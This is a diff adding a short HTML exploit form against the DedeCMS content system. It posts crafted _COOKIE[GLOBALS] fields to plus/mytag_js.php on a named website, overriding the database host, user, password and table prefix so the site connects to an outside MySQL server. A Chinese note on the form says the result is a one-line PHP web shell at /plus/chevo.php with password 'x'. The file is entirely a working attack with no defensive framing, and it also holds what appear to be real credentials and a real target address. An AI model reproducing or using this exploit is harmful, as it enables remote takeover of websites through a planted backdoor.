@@ -1,0 +1,22 @@
+<form action="" method="post" name="QuickSearch" id="QuickSearch" onsubmit="addaction();">
+<input type="text" value="http://www.gesong.org/plus/mytag_js.php?aid=1" name="doaction" style="width:400"><br />
+<input name="_COOKIE[GLOBALS][cfg_dbhost]" style="width:1" value="124.205.79.194">
+<br />
+<input name="_COOKIE[GLOBALS][cfg_dbuser]" style="width:1" value="root">
+<br />
+<input name="_COOKIE[GLOBALS][cfg_dbpwd]" style="width:1" value="xuegong">
+<br />
+<input name="_COOKIE[GLOBALS][cfg_dbname]" style="width:1" value="xuegong">
+<br />
+<input name="_COOKIE[GLOBALS][cfg_dbprefix]" style="width:1" value="dede_">
+<br />
+<input name="nocache" type="password" style="width:400" value="true">
+<input type="submit" value="爆菊花" name="QuickSearchBtn">
+<br /><p>生成一句话 /plus/chevo.php ，密码x</p>
+</form>
+<script>
+function addaction()
+{
+document.QuickSearch.action=document.QuickSearch.doaction.value;
+}
+</script>
